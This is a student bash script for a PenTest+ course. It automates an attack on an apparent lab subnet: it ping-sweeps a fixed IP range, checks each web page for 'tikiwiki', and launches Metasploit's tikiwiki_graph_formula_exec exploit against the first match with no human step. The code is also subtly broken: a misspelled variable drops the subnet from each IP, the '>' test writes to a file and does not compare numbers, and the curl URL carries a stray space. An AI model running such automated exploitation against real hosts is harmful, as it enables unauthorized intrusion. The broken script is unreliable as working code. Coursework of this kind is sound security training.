#April Parker
#CSIT 188 PenTest+
# The goal was to have the script be 100% automated with no human interaction
#This script is meant to run in a Virtual Environment with a Metasploit (attacker vm) with several potential victim VMs. 
#The script will scan the subnet and locate a system where the tikiwiki vulnerability exist and exploit it. 

#!/bin/bash

#I dont know what machine is vulnerable so I hardcoded the first 3 octets of the subnet
subnet="192.168.68."

#Ping Sweep - What systems are alive - I added the 10-15 range to scan due to speed
for octetFour in {10..13}
do
	ip="$subnut$octetFour"
	echo "Checking" $ip
	ping -c 1 $ip>>ping.txt
done

#Output successful pings 
cat ping.txt | grep -B1 '1 received' >> pingresults.txt

#Read Ping Results, Output Victims Machine
victimIP="$(head -n1 pingresults.txt | cut -d ' ' -f2)"
echo "The victim IP is" "${victimIP}"

#Pull tikiwiki from html file being served at victim's IP
flag="$(curl -s http://"${victimIP} " | grep -c 'tikiwiki')"

if [ $flag > 0 ]
then
	echo "Starting msfconsole...please wait"
	msfconsole -q -x "use exploit/unix/webapp/tikiwiki_graph_formula_exec;set rhost ${victimIP};exploit;"
else
	echo "tikiwiki not found"
fi 
